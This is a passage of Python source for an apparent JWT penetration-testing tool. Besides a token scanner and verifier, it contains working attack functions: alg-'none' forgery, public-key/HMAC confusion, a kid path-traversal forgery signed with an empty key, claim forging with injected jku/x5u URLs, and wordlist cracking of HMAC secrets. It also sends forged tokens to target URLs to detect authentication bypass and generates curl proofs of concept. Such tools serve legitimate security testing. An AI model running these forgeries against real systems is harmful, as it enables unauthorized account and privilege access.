        "sensitive_claim": "Claim sensible potentiel : '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "nested_payload": "[*] PAYLOAD BASE64 IMBRIQUÉ DÉTECTÉ (Clé : '{key}')",
        "nested_type": "Type : {type}",
        "nested_class": "Classe : {class_name}",
        "nested_extracted": "Chaînes Extraites :",
        "nested_hex": "Hex Dump :",
        "token_type": "[*] TYPE DE TOKEN : {type}",
        "parse_error": "[!] Erreur d'analyse : {error}",
        "jwe_encrypted": "[*] Le payload JWE est chiffré.",
        "duplicate_keys": "[!] Clés dupliquées détectées : {keys}",
        "attack_mode": "[*] MODE ATTAQUE : {mode}",
        "attack_failed": "[!] Attaque échouée : {error}",
        "forged_token": "[+] Token Falsifié :",
        "verification": "[*] VÉRIFICATION",
        "sig_valid": "[+] Signature VALIDE",
        "sig_invalid": "[!] Signature INVALIDE",
        "verification_error": "[!] Erreur de vérification : {error}",
        "cracking": "[*] CRAQUAGE DU SECRET HMAC",
        "secret_found": "[+] Secret trouvé : {secret}",
        "secret_not_found": "[!] Aucun secret trouvé dans la wordlist.",
        "error": "[!] Erreur : {error}",
        "jwks_fetching": "[*] Récupération du JWKS depuis {url}...",
        "jwks_found": "[+] {count} clés trouvées.",
        "jwks_private_key": "[!] AVERTISSEMENT : Matériel de clé privée trouvé (paramètre 'd') !",
        "jwks_error": "[!] Erreur lors de la récupération du JWKS : {error}",
        "http_testing": "[*] Test de l'Endpoint HTTP : {method} {url}",
        "http_mutated": "Statut Muté : {status} | Longueur : {length}",
        "http_baseline": "Statut Baseline : {status} | Longueur : {length}",
        "http_identical": "[!] Réponse identique à la baseline. Pas de bypass.",
        "http_diff": "[+] Réponse différente ! Bypass possible.",
        "http_suspicious": "[?] Réponse différente, à investiguer manuellement.",
        "http_error": "[!] Erreur HTTP : {error}",
        "http_success_str": "[+] Chaîne de succès trouvée dans la réponse.",
        "http_failure_str": "[!] Chaîne d'échec trouvée dans la réponse.",
        "invalid_base64": "Caractères Base64URL invalides dans le segment",
        "invalid_length": "Longueur Base64URL invalide",
        "base64_error": "Échec du décodage Base64URL : {error}",
        "invalid_json": "JSON invalide : {error}",
        "invalid_json_nan": "JSON invalide (NaN ou Infinity trouvé)",
        "expected_parts": "3 (JWS) ou 5 (JWE) parties attendues, {parts} trouvées",
        "no_jwt": "Aucun JWT trouvé dans l'entrée",
        "unsupported_hmac": "Algorithme HMAC non supporté : {alg}",
        "crypto_missing": "Bibliothèque 'cryptography' manquante. pip install cryptography",
        "requests_missing": "[!] Bibliothèque 'requests' requise pour les tests HTTP. pip install requests",
        "unsupported_asym": "Algorithme asymétrique non supporté : {alg}",
        "cannot_forge_secret": "Impossible de falsifier avec un secret pour alg : {alg}",
        "jwe_crack": "JWE ne peut pas être craqué de cette manière",
        "not_hmac": "Pas HMAC : {alg}",
        "wordlist_error": "Impossible de lire la wordlist : {error}",
        "pubkey_required": "--pubkey requis pour la confusion",
        "secret_required": "-k/--secret requis pour falsifier",
        "pubkey_load_error": "Échec du chargement de la clé publique : {error}",
        "invalid_ecdsa_len": "Longueur de signature ECDSA invalide",
        "poc_generated": "[+] Preuve de Concept (PoC) générée :",
        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
        "cve_2022_21449": "CVE-2022-21449 : malléabilité de signature ECDSA (r/s mis à zéro) pourrait être acceptée",
        "typ_missing": "En-tête 'typ' manquant (confusion de type de token)",
        "typ_unexpected": "En-tête 'typ' inattendu : '{typ}' (JWT attendu)",
        "crit_present": "En-tête 'crit' présent : {crit} (vérifier la gestion des paramètres critiques)",
        "b64_false": "L'en-tête 'b64' est false (RFC 7797) : le payload n'est pas encodé en base64url",
        "jku_suspicious": "'jku' contient une URL suspecte : {url}",
        "x5u_suspicious": "'x5u' contient une URL suspecte : {url}",
        "kid_injection": "'kid' contient des caractères dangereux : {kid}",
        "risk_score": "[*] Score de Risque Global : {score} ({level})",
        "json_output": "[*] Sortie JSON écrite dans {file}",
    }
}

def t(msg_key, **kwargs):
    msg = TRANSLATIONS.get(CURRENT_LANG, TRANSLATIONS["en"]).get(msg_key)
    if not msg:
        msg = TRANSLATIONS["en"].get(msg_key, msg_key)
    if kwargs:
        return msg.format(**kwargs)
    return msg

# --- OPTIONAL DEPENDENCIES ---
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa, ec, ed25519, ed448, utils
    from cryptography import x509
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

class JwtError(Exception):
    pass

# --------------------------------------------------------- NESTED PAYLOAD ANALYZER --
def extract_java_strings(data):
    strings = []
    i = 0
    while i < len(data):
        if data[i] == 0x74:
            if i + 3 <= len(data):
                length = int.from_bytes(data[i+1:i+3], 'big')
                if i + 3 + length <= len(data):
                    try:
                        val = data[i+3:i+3+length].decode('utf-8', errors='ignore')
                        if len(val) > 2:
                            strings.append(val)
                        i += 3 + length
                        continue
                    except:
                        pass
        i += 1
    return strings

def extract_php_strings(data):
    strings = []
    pattern = re.compile(rb's:(\d+):"(.*?)";')
    for m in pattern.finditer(data):
        try:
            val = m.group(2).decode('utf-8', errors='ignore')
            if len(val) > 2:
                strings.append(val)
        except:
            pass
    return strings

def extract_python_pickle(data):
    strings = []
    pattern = re.compile(rb'[\x20-\x7E]{4,}')
    for m in pattern.finditer(data):
        try:
            val = m.group(0).decode('utf-8', errors='ignore')
            if not any(x in val for x in ["__", "builtins", "sys.", "os."]):
                strings.append(val)
        except:
            pass
    return strings

def try_decompress(data):
    if data.startswith(b'\x1f\x8b'):
        try:
            return gzip.decompress(data), "GZIP Compressed"
        except:
            pass
    if len(data) > 2 and data[0] == 0x78 and data[1] in (0x01, 0x9c, 0xda):
        try:
            return zlib.decompress(data), "ZLIB Compressed"
        except:
            pass
    return None, None

def decode_nested_base64(val_str):
    try:
        padded = val_str + "=" * (-len(val_str) % 4)
        return base64.b64decode(padded, validate=True)
    except:
        pass
    try:
        padded = val_str + "=" * (-len(val_str) % 4)
        return base64.urlsafe_b64decode(padded)
    except:
        pass
    return None

def analyze_nested_payload(payload):
    for k, v in payload.items():
        if not isinstance(v, str) or len(v) < 20:
            continue
        decoded = decode_nested_base64(v)
        if not decoded:
            continue
        decompressed, comp_type = try_decompress(decoded)
        if decompressed:
            print(f"\n{YELLOW}{t('nested_payload', key=k)}{RESET}")
            print(f"  {WHITE}Tipo: {comp_type}{RESET}")
            print(f"  {WHITE}Dimensione decompressa: {len(decompressed)} bytes{RESET}")
            decoded = decompressed
        fmt = None
        extracted = []
        if decoded.startswith(b'\xac\xed\x00\x05'):
            fmt = "Java Serialization"
            extracted = extract_java_strings(decoded)
        elif decoded.startswith(b'O:') or decoded.startswith(b'a:') or decoded.startswith(b's:'):
            fmt = "PHP Serialization"
            extracted = extract_php_strings(decoded)
        elif decoded.startswith(b'\x80\x04') or decoded.startswith(b'\x80\x03'):
            fmt = "Python Pickle"
            extracted = extract_python_pickle(decoded)
        elif decoded.startswith(b'/wEP'):
            fmt = ".NET ViewState"
            inner, _ = try_decompress(decoded[2:])
            if inner:
                extracted = extract_php_strings(inner)
        if fmt:
            print(f"\n{YELLOW}{t('nested_payload', key=k)}{RESET}")
            print(f"  {WHITE}{t('nested_type', type=fmt)}{RESET}")
            if extracted:
                print(f"  {WHITE}{t('nested_extracted')}{RESET}")
                for s in extracted:
                    print(f"    {GREEN}- {s}{RESET}")
            else:
                print(f"  {DIM}(no printable strings found){RESET}")
        else:
            if len(decoded) > 8:
                print(f"\n{YELLOW}{t('nested_payload', key=k)}{RESET}")
                print(f"  {WHITE}Tipo: Unknown (Base64 valid, showing hex dump){RESET}")
                print(f"  {WHITE}{t('nested_hex')}{RESET}")
                for i in range(0, min(len(decoded), 64), 16):
                    chunk = decoded[i:i+16]
                    hex_str = ' '.join(f'{b:02x}' for b in chunk)
                    ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                    print(f"    {DRED}{i:08x}{RESET}  {hex_str.ljust(48)}  {WHITE}{ascii_str}{RESET}")

# --------------------------------------------------------- PARSING & DECODE --
def b64url_decode(segment):
    if not segment:
        return b""
    if not re.match(r"^[A-Za-z0-9_\-]+$", segment):
        raise JwtError(t("invalid_base64"))
    if len(segment) % 4 == 1:
        raise JwtError(t("invalid_length"))
    padded = segment + "=" * (-len(segment) % 4)
    try:
        return base64.urlsafe_b64decode(padded)
    except Exception as e:
        raise JwtError(t("base64_error", error=e))

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def strict_json_loads(data):
    try:
        text = data.decode("utf-8")
        if re.search(r'\b(NaN|Infinity)\b', text):
            raise JwtError(t("invalid_json_nan"))
        duplicates = []
        def hook(pairs):
            d = {}
            for k, v in pairs:
                if k in d:
                    duplicates.append(k)
                d[k] = v
            return d
        return json.loads(text, object_pairs_hook=hook), duplicates
    except json.JSONDecodeError as e:
        raise JwtError(t("invalid_json", error=e))

def parse_token(token):
    parts = token.split(".")
    if len(parts) not in (3, 5):
        raise JwtError(t("expected_parts", parts=len(parts)))
    header_raw = b64url_decode(parts[0])
    header, dup_h = strict_json_loads(header_raw)
    if len(parts) == 5:
        return {"raw": token, "parts": parts, "header": header, "type": "JWE", "duplicates": dup_h}
    payload_raw = b64url_decode(parts[1])
    payload, dup_p = strict_json_loads(payload_raw)
    sig_raw = b64url_decode(parts[2])
    return {
        "raw": token, "parts": parts, "header": header, "payload": payload,
        "signature": sig_raw, "type": "JWS", "duplicates": dup_h + dup_p
    }

def extract_token(raw):
    raw = raw.strip()
    candidates = re.findall(r"[A-Za-z0-9_\-+/]+(?:\.[A-Za-z0-9_\-+/]*){2,4}", raw)
    if not candidates:
        raise JwtError(t("no_jwt"))
    return max(candidates, key=len)

# --------------------------------------------------------- CRYPTO ENGINE --
def verify_hmac(info, secret):
    alg = info["header"].get("alg")
    if alg not in HMAC_ALGS:
        raise JwtError(t("unsupported_hmac", alg=alg))
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
    return hmac.compare_digest(expected, info["signature"])

def verify_asymmetric(info, pub_key_bytes):
    if not HAS_CRYPTO:
        raise JwtError(t("crypto_missing"))
    try:
        public_key = serialization.load_pem_public_key(pub_key_bytes)
    except Exception as e:
        raise JwtError(t("pubkey_load_error", error=e))
    return verify_asymmetric_with_key(info, public_key)

def verify_asymmetric_with_key(info, public_key):
    alg = info["header"].get("alg")
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    try:
        if alg.startswith("RS"):
            hash_alg = hashes.SHA256() if alg == "RS256" else hashes.SHA384() if alg == "RS384" else hashes.SHA512()
            public_key.verify(info["signature"], signing_input, padding.PKCS1v15(), hash_alg)
        elif alg.startswith("PS"):
            hash_alg = hashes.SHA256() if alg == "PS256" else hashes.SHA384() if alg == "PS384" else hashes.SHA512()
            public_key.verify(info["signature"], signing_input, padding.PSS(mgf=padding.MGF1(hash_alg), salt_length=hash_alg.digest_size), hash_alg)
        elif alg.startswith("ES"):
            hash_alg = hashes.SHA256() if alg == "ES256" else hashes.SHA384() if alg == "ES384" else hashes.SHA512()
            key_size = public_key.key_size
            num_bytes = (key_size + 7) // 8
            if len(info["signature"]) != 2 * num_bytes:
                raise JwtError(t("invalid_ecdsa_len"))
            r = int.from_bytes(info["signature"][:num_bytes], 'big')
            s = int.from_bytes(info["signature"][num_bytes:], 'big')
            der_sig = utils.encode_dss_signature(r, s)
            public_key.verify(der_sig, signing_input, ec.ECDSA(hash_alg))
        elif alg in ("EdDSA", "Ed25519", "Ed448"):
            public_key.verify(info["signature"], signing_input)
        else:
            raise JwtError(t("unsupported_asym", alg=alg))
        return True
    except Exception:
        return False

# --------------------------------------------------------- TOKEN GENERATOR --
def generate_token(alg, claims_to_set, secret=None, exp_seconds=None):
    """Build a fresh JWT from scratch for lab/testing use (alg 'none' or HMAC)."""
    header = {"alg": alg, "typ": "JWT"}
    payload = {}
    now_ts = int(time.time())
    payload["iat"] = now_ts
    if exp_seconds is not None:
        payload["exp"] = now_ts + exp_seconds
    for assignment in claims_to_set:
        k, v_str = assignment.split("=", 1)
        try:
            v = json.loads(v_str)
        except json.JSONDecodeError:
            v = v_str
        payload[k] = v
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}".encode()
    if alg.lower() == "none":
        return f"{header_b64}.{payload_b64}.", header, payload
    if alg.upper() not in HMAC_ALGS:
        raise JwtError(t("generate_unsupported_alg"))
    if not secret:
        raise JwtError(t("generate_secret_required"))
    sig = hmac.new(secret.encode(), signing_input, HMAC_ALGS[alg.upper()]).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}", header, payload

# --------------------------------------------------------- ATTACK ENGINE --
def forge_none(info):
    header = dict(info["header"])
    header["alg"] = "none"
    return f"{b64url_encode(json.dumps(header, separators=(',', ':')))}.{info['parts'][1]}."

def forge_confusion(info, pubkey_bytes):
    header = dict(info["header"])
    header["alg"] = "HS256"
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    signing_input = f"{header_b64}.{info['parts'][1]}".encode()
    sig = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{info['parts'][1]}.{b64url_encode(sig)}"

def forge_kid(info):
    header = dict(info["header"])
    header["alg"] = "HS256"
    header["kid"] = "../../../../../../dev/null"
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    signing_input = f"{header_b64}.{info['parts'][1]}".encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{info['parts'][1]}.{b64url_encode(sig)}"

def forge_claims(info, claims_to_set, secret, jku=None, x5u=None):
    header = dict(info["header"])
    payload = dict(info["payload"])
    if jku:
        header["jku"] = jku
    if x5u:
        header["x5u"] = x5u
    for assignment in claims_to_set:
        k, v_str = assignment.split("=", 1)
        try:
            v = json.loads(v_str)
        except json.JSONDecodeError:
            v = v_str
        payload[k] = v
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}".encode()
    alg = header.get("alg", "HS256")
    if alg in HMAC_ALGS:
        sig = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
    else:
        raise JwtError(t("cannot_forge_secret", alg=alg))
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"

# --------------------------------------------------------- CRACK ENGINE --
def crack_hmac(token, wordlist_path, max_lines=None):
    """Returns (found_word_or_None, attempts, elapsed_seconds, estimated_total_words)."""
    info = parse_token(token)
    if info["type"] != "JWS":
        raise JwtError(t("jwe_crack"))
    alg = info["header"].get("alg")
    if alg not in HMAC_ALGS:
        raise JwtError(t("not_hmac", alg=alg))
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    target_sig = info["signature"]
    start = time.time()
    attempts = 0
    estimated_total = None
    try:
        file_size = os.path.getsize(wordlist_path)
    except OSError:
        file_size = None
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if max_lines and i >= max_lines:
                    break
                word = line.rstrip("\n\r")
                if estimated_total is None and file_size and i == 999 and f.tell() > 0:
                    avg_bytes = f.tell() / (i + 1)
                    if avg_bytes > 0:
                        estimated_total = int(file_size / avg_bytes)
                if not word:
                    continue
                attempts += 1
                secret = word.encode()
                expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
                if hmac.compare_digest(expected, target_sig):
                    return word, attempts, time.time() - start, estimated_total
    except OSError as e:
        raise JwtError(t("wordlist_error", error=e))
    return None, attempts, time.time() - start, estimated_total

# --------------------------------------------------------- VULN SCANNER --
def analyze(info, now):
    findings = []
    header = info.get("header", {})
    payload = info.get("payload", {})
    alg = header.get("alg")
    
    if not alg:
        findings.append(("HIGH", t("missing_alg")))
    elif str(alg).lower() == "none":
        findings.append(("CRITICAL", t("alg_none")))
    elif alg.upper() in HMAC_ALGS:
        findings.append(("INFO", t("hmac_sym", alg=alg)))
    elif alg.startswith(("RS", "PS", "ES")):
        findings.append(("INFO", t("asym_info", alg=alg)))
    
    if "typ" not in header:
        findings.append(("MEDIUM", t("typ_missing")))
    elif header["typ"] != "JWT":
        findings.append(("LOW", t("typ_unexpected", typ=header["typ"])))
    
    if "crit" in header:
        findings.append(("MEDIUM", t("crit_present", crit=header["crit"])))
    if header.get("b64") is False:
        findings.append(("MEDIUM", t("b64_false")))
    
    if "exp" not in payload:
        findings.append(("MEDIUM", t("missing_exp")))
    else:
        exp = payload["exp"]
        if not isinstance(exp, (int, float)):
            findings.append(("HIGH", t("invalid_exp")))
        elif exp < now:
            findings.append(("INFO", t("token_expired")))
        elif exp - now > 86400:
            findings.append(("LOW", t("long_lifetime", hours=int((exp-now)/3600))))
    
    if "iat" in payload:
        iat = payload["iat"]
        if isinstance(iat, (int, float)) and iat > now + 60:
            findings.append(("MEDIUM", t("future_iat")))
    
    if "iss" not in payload:
        findings.append(("LOW", t("missing_iss")))
    if "aud" not in payload:
        findings.append(("LOW", t("missing_aud")))
    
    if "kid" in header:
        kid = str(header["kid"])
        if "../" in kid or "/" in kid:
            findings.append(("HIGH", t("kid_traversal")))
        if "'" in kid or '"' in kid or "union" in kid.lower():
            findings.append(("HIGH", t("kid_sqli")))
        if re.search(r"[;|&$`]", kid):
            findings.append(("MEDIUM", t("kid_injection", kid=kid)))
    
    if "jku" in header:
        jku = header["jku"]
        findings.append(("MEDIUM", t("jku_present", url=jku)))
        if not jku.startswith("https://"):
            findings.append(("HIGH", t("jku_suspicious", url=jku)))
    if "x5u" in header:
        x5u = header["x5u"]
        findings.append(("MEDIUM", t("x5u_present", url=x5u)))
        if not x5u.startswith("https://"):
            findings.append(("HIGH", t("x5u_suspicious", url=x5u)))
    if "jwk" in header:
        findings.append(("HIGH", t("jwk_present")))
    if "x5c" in header:
        findings.append(("HIGH", t("x5c_present")))
    
    # CVE-2022-21449: ECDSA signature malleability
    if alg and alg.startswith("ES"):
        sig = info.get("signature", b"")
        if len(sig) > 0:
            half = len(sig) // 2
            r = sig[:half]
            s = sig[half:]
            if r == b'\x00' * half or s == b'\x00' * half:
                findings.append(("CRITICAL", t("cve_2022_21449")))
    
    sensitive_keys = ["password", "secret", "token", "api_key", "email"]
    for k in payload:
        if any(s in k.lower() for s in sensitive_keys):
            findings.append(("INFO", t("sensitive_claim", key=k)))
    
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda x: sev_order.get(x[0], 5))
    return findings

# --------------------------------------------------------- HTTP ENGINE --
def export_burp_request(filepath, url, method, headers_str, new_token):
    """Write a raw HTTP request file suitable for pasting into Burp Repeater."""
    parsed = urllib.parse.urlsplit(url)
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"
    lines = [f"{method.upper()} {path} HTTP/1.1", f"Host: {parsed.netloc}"]
    if headers_str:
        for h in headers_str.split(","):
            k, v = h.split(":", 1)
            lines.append(f"{k.strip()}: {v.strip()}")
    lines.append(f"Authorization: Bearer {new_token}")
    lines.append("Connection: close")
    lines.append("")
    lines.append("")
    with open(filepath, "w") as f:
        f.write("\r\n".join(lines))

def test_http_endpoint(url, method, headers_str, new_token, original_token=None, insecure=False,
                       success_strings=None, failure_strings=None):
    if not HAS_REQUESTS:
        print(t("requests_missing"))
        return
    headers = {}
    if headers_str:
        for h in headers_str.split(","):
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    headers["Authorization"] = f"Bearer {new_token}"
    print(f"\n{DRED}{t('http_testing', method=method, url=url)}{RESET}")
    try:
        r_new = requests.request(method, url, headers=headers, timeout=10, verify=not insecure)
        print(f"  {WHITE}{t('http_mutated', status=r_new.status_code, length=len(r_new.text))}{RESET}")
        if original_token:
            headers_orig = headers.copy()
            headers_orig["Authorization"] = f"Bearer {original_token}"
            r_orig = requests.request(method, url, headers=headers_orig, timeout=10, verify=not insecure)
            print(f"  {DIM}{t('http_baseline', status=r_orig.status_code, length=len(r_orig.text))}{RESET}")
            if r_new.status_code == r_orig.status_code and len(r_new.text) == len(r_orig.text):
                print(f"  {YELLOW}{t('http_identical')}{RESET}")
            elif r_new.status_code == 200 and r_orig.status_code != 200:
                print(f"  {GREEN}{t('http_diff')}{RESET}")
                print(f"  {DIM}{r_new.text[:200]}...{RESET}")
            else:
                print(f"  {YELLOW}{t('http_suspicious')}{RESET}")
        if success_strings:
            for s in success_strings.split(","):
                if s.strip() in r_new.text:
                    print(f"  {GREEN}{t('http_success_str')}{RESET}")
                    break
        if failure_strings:
            for s in failure_strings.split(","):
                if s.strip() in r_new.text:
                    print(f"  {RED}{t('http_failure_str')}{RESET}")
                    break
    except Exception as e:
        print(f"  {RED}{t('http_error', error=e)}{RESET}")

# --------------------------------------------------------- X5C CHAIN VERIFIER --
def verify_x5c_leaf(info):
    """Verify the signature against the leaf certificate embedded in the header's 'x5c'.
    This only proves the header is self-consistent: an attacker who controls the
    header can embed their own certificate, so this is NOT proof of trust."""
    if not HAS_CRYPTO:
        raise JwtError(t("crypto_missing"))
    x5c = info["header"].get("x5c")
    if not x5c:
        return None
    leaf_der = base64.b64decode(x5c[0])
    cert = x509.load_der_x509_certificate(leaf_der)
    public_key = cert.public_key()
    return verify_asymmetric_with_key(info, public_key)

# --------------------------------------------------------- JWKS ANALYZER --
def analyze_jwks(url, insecure=False):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    print(f"{DRED}{t('jwks_fetching', url=url)}{RESET}")
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'myjwt'})
        with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
            jwks = json.loads(response.read().decode())
        keys = jwks.get("keys", [])
        print(f"{WHITE}{t('jwks_found', count=len(keys))}{RESET}")
        seen_kids = {}
        enc_algs = ("RSA-OAEP", "RSA-OAEP-256", "RSA1_5", "A128KW", "A192KW", "A256KW", "ECDH-ES")
        sig_algs = ("RS", "PS", "ES", "HS", "EdDSA")
        for i, k in enumerate(keys):
            kid = k.get('kid')
            alg = k.get('alg')
            use = k.get('use')
            print(f"  {RED}Key {i+1}:{RESET} kty={k.get('kty')}, kid={kid}, alg={alg}, use={use}")
            if k.get('d'):
                print(f"    {RED}{t('jwks_private_key')}{RESET}")
            if kid is None:
                print(f"    {YELLOW}{t('jwks_missing_kid', index=i+1)}{RESET}")
            else:
                seen_kids.setdefault(kid, []).append(i + 1)
            if use is None:
                print(f"    {DIM}{t('jwks_missing_use', index=i+1, kid=kid)}{RESET}")
            elif alg:
                is_enc_alg = str(alg).upper() in enc_algs or str(alg).upper().startswith("RSA-OAEP")
                is_sig_alg = str(alg).upper().startswith(sig_algs)
                if (use == "sig" and is_enc_alg) or (use == "enc" and is_sig_alg):
                    print(f"    {RED}{t('jwks_sig_enc_conflict', index=i+1, kid=kid, use=use, alg=alg)}{RESET}")
        for kid, indexes in seen_kids.items():
            if len(indexes) > 1:
                print(f"  {RED}{t('jwks_duplicate_kid', kid=kid)}{RESET} (keys {indexes})")
    except Exception as e:
        print(f"{RED}{t('jwks_error', error=e)}{RESET}")

# --------------------------------------------------------- MAIN & CLI --
def main():
    global CURRENT_LANG, RED, DRED, WHITE, BLACK, GREEN, YELLOW, DIM, RESET, BOLD

    logo = f"""
{WHITE}{BOLD}██╗  ██╗ █████╗  ██████╗██╗  ██╗{RED}██╗████████╗ █████╗ {RESET}
{WHITE}{BOLD}██║  ██║██╔══██╗██╔════╝██║ ██╔╝{RED}██║╚══██╔══╝██╔══██╗{RESET}
{WHITE}{BOLD}███████║███████║██║     █████╔╝ {RED}██║   ██║   ███████║{RESET}
{WHITE}{BOLD}██╔══██║██╔══██║██║     ██╔═██╗ {RED}██║   ██║   ██╔══██║{RESET}
{WHITE}{BOLD}██║  ██║██║  ██║╚██████╗██║  ██╗{RED}██║   ██║   ██║  ██║{RESET}
{WHITE}{BOLD}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{RED}╚═╝   ╚═╝   ╚═╝  ╚═╝{RESET}
{DRED}  J W T   S E C U R I T Y   T E S T I N G   F R A M E W O R K  {RESET}
"""

    parser = argparse.ArgumentParser(
        description="myjwt - JWT Security Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("token", nargs="?", help="JWT token to analyze")
    parser.add_argument("-f", "--file", help="Read token from file")
    parser.add_argument("--jwks", help="Fetch and analyze a JWKS URL")
    parser.add_argument("--analyze", action="store_true", help="Run vulnerability scanner")
    parser.add_argument("--crack", metavar="WORDLIST", help="Crack HMAC secret")
    parser.add_argument("--max-lines", type=int, help="Limit wordlist lines")
    parser.add_argument("--attack", choices=["none", "confusion", "kid", "forge"], help="Run an attack")
    parser.add_argument("--generate", metavar="ALG", help="Generate a fresh test token (alg 'none' or HS256/HS384/HS512)")
    parser.add_argument("--exp", type=int, metavar="SECONDS", help="With --generate: expiry in seconds from now")
    parser.add_argument("--export-burp", metavar="FILE", help="With --url/--attack: write a raw HTTP request file for Burp Repeater")
    parser.add_argument("--set", action="append", default=[], help="Claim=value (JSON supported)")
    parser.add_argument("-k", "--secret", help="Secret for HMAC")
    parser.add_argument("-K", "--pubkey", help="Public key file for asymmetric ops")
    parser.add_argument("--url", help="Target URL for HTTP testing")
    parser.add_argument("--method", default="GET", help="HTTP method")
    parser.add_argument("--headers", help="Custom headers (e.g. 'X-Forwarded-For: 127.0.0.1')")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    parser.add_argument("--jku", help="JKU URL to inject")
    parser.add_argument("--x5u", help="X5U URL to inject")
    parser.add_argument("--verify-endpoint", help="Endpoint to verify the forged token against")
    parser.add_argument("--success-strings", help="Comma-separated strings indicating success")
    parser.add_argument("--failure-strings", help="Comma-separated strings indicating failure")
    parser.add_argument("--poc", action="store_true", help="Generate Proof of Concept (curl command)")
    parser.add_argument("--json", action="store_true", help="Output findings as JSON")
    parser.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    
    lang_group = parser.add_mutually_exclusive_group()
    lang_group.add_argument("-en", action="store_const", const="en", dest="lang", help="English (default)")
    lang_group.add_argument("-it", action="store_const", const="it", dest="lang", help="Italiano")
    lang_group.add_argument("-es", action="store_const", const="es", dest="lang", help="Español")
    lang_group.add_argument("-pt", action="store_const", const="pt", dest="lang", help="Português")
    lang_group.add_argument("-de", action="store_const", const="de", dest="lang", help="Deutsch")
    lang_group.add_argument("-fr", action="store_const", const="fr", dest="lang", help="Français")
    parser.set_defaults(lang="en")
    
    args = parser.parse_args()
    CURRENT_LANG = args.lang
    
    if args.no_color or not sys.stdout.isatty():
        RED = DRED = WHITE = BLACK = GREEN = YELLOW = DIM = RESET = BOLD = ""
    
    if not args.token and not args.file and not args.jwks and not args.generate:
        print(logo)
        parser.print_help()
        sys.exit(2)

    if sys.stdout.isatty():
        print(logo)

    if args.generate:
        print(f"{DRED}{t('generating')}{RESET}")
        try:
            new_token, header, payload = generate_token(args.generate, args.set, args.secret, args.exp)
        except JwtError as e:
            print(f"{RED}{t('error', error=e)}{RESET}")
            sys.exit(1)
        print(f"{RED}{BOLD}{t('header')}{RESET}")
        print(json.dumps(header, indent=2))
        print(f"{RED}{BOLD}{t('payload')}{RESET}")
        print(json.dumps(payload, indent=2))
        print(f"{GREEN}{t('generated_token', alg=args.generate)}{RESET}\n{new_token}")
        sys.exit(0)

    if args.jwks:
        analyze_jwks(args.jwks, insecure=args.insecure)
        sys.exit(0)

    try:
        raw = open(args.file).read() if args.file else args.token
        token = extract_token(raw)
        info = parse_token(token)
    except JwtError as e:
        print(f"{RED}{t('parse_error', error=e)}{RESET}")
        sys.exit(1)
    
    print(f"{DRED}=================================================={RESET}")
    print(f"{RED}{BOLD}{t('token_type', type=info['type'])}{RESET}")
    print(f"{RED}{BOLD}{t('header')}{RESET}")
    print(json.dumps(info["header"], indent=2))
    
    if info["type"] == "JWS":
        print(f"{RED}{BOLD}{t('payload')}{RESET}")
        print(json.dumps(info["payload"], indent=2))
        analyze_nested_payload(info["payload"])
    else:
        print(f"{DIM}{t('jwe_encrypted')}{RESET}")
    
    if info["duplicates"]:
        print(f"{RED}{t('duplicate_keys', keys=info['duplicates'])}{RESET}")
    
    findings = []
    if args.analyze and info["type"] == "JWS":
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('vuln_analysis')}{RESET}")
        findings = analyze(info, time.time())
        if not findings:
            print(f"  {GREEN}{t('no_issues')}{RESET}")
        else:
            for sev, msg in findings:
                if sev == "CRITICAL":
                    color = f"{BOLD}{DRED}"
                elif sev == "HIGH":
                    color = RED
                elif sev == "MEDIUM":
                    color = YELLOW
                elif sev == "LOW":
                    color = GREEN
                else:
                    color = WHITE
                print(f"  {color}[{sev}]{RESET} {msg}")
        
        # Risk score
        if findings:
            score_map = {"CRITICAL": 10, "HIGH": 5, "MEDIUM": 2, "LOW": 1, "INFO": 0}
            total = sum(score_map.get(s, 0) for s, _ in findings)
            if total >= 15:
                level = "CRITICAL"
            elif total >= 8:
                level = "HIGH"
            elif total >= 3:
                level = "MEDIUM"
            else:
                level = "LOW"
